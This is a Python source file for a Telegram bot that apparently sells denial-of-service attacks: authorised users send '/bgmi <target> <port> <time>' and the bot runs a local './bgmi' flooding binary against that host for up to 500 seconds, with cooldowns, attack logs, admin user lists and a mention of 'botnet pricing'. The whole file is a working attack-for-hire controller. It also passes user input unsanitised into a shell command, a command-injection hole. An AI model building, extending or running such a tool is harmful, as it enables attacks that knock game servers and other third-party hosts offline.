#!/usr/bin/python3

import telebot
import subprocess
import datetime
import time
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('YOUR_BOT_TOKEN_HERE')

# Admin user IDs
admin_id = ["5689106127", "6910445402", "5696319794"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Dictionary to track active attacks
active_attacks = {}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log commands
def log_command(user_id, target, port, time_duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_duration}\n\n")

# Dictionary to track cooldown for the /bgmi command
bgmi_cooldown = {}

# **START ATTACK COMMAND**
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            # Check cooldown (5 minutes)
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                bot.reply_to(message, "You are on cooldown. Please wait 5 minutes before starting another attack.")
                return
            
            bgmi_cooldown[user_id] = datetime.datetime.now()

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time_duration = int(command[3])

            if time_duration > 500:
                bot.reply_to(message, "Error: Time interval must be less than 500 seconds.")
                return

            log_command(user_id, target, port, time_duration)

            response = f"🚀 **Attack Started!**\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏳ Duration: {time_duration} seconds\n⚡ Method: BGMI\nBy @Indivual1X"
            bot.reply_to(message, response)

            full_command = f"./bgmi {target} {port} {time_duration} 500"
            process = subprocess.Popen(full_command, shell=True)

            active_attacks[user_id] = process  # Store process to stop later

            # Wait for the attack duration
            time.sleep(time_duration)

            # Stop the attack after the time duration
            process.terminate()
            del active_attacks[user_id]  # Remove from active list

            bot.reply_to(message, f"✅ **Attack Finished!**\n🎯 Target: {target}\n🔌 Port: {port}\n⏳ Duration: {time_duration} seconds.")

        else:
            bot.reply_to(message, "⚠ **Usage:** `/bgmi <target> <port> <time>`\nBy @Indivual1X")
    else:
        bot.reply_to(message, "🚫 You are not authorized to use this command.\nBy @Indivual1X")


# **STOP ATTACK COMMAND**
@bot.message_handler(commands=['stopattack'])
def stop_attack(message):
    user_id = str(message.chat.id)
    
    if user_id in active_attacks:
        active_attacks[user_id].terminate()  # Stop attack process
        del active_attacks[user_id]  # Remove from active list
        bot.reply_to(message, "🚨 Attack Stopped Successfully!")
    else:
        bot.reply_to(message, "⚠ No active attack found for you.")

# Handler for /id command
@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.reply_to(message, f"🆔 **Your ID:** `{message.chat.id}`")

# Handler for /help command
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''📌 **Available Commands:**
✅ `/bgmi <target> <port> <time>` → Start attack.
✅ `/stopattack` → Stop attack manually.
✅ `/id` → Show your user ID.
✅ `/rules` → View attack rules.
✅ `/mylogs` → Check recent attack logs.
✅ `/plan` → Check botnet pricing.

🔐 **Admin Commands:**
🛠 `/add <userId>` → Add a user.
🛠 `/remove <userId>` → Remove a user.
🛠 `/allusers` → List all authorized users.
🛠 `/logs` → Show all user logs.
🛠 `/broadcast <message>` → Send a message to all users.
🛠 `/clearlogs` → Clear logs.

By @Indivual1X
'''
    bot.reply_to(message, help_text, parse_mode="Markdown")

# Handler for /start command
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"👋 **Welcome, {user_name}!**\nType `/help` to see available commands.\nBy @Indivual1X"
    bot.reply_to(message, response, parse_mode="Markdown")

# Polling
bot.polling()
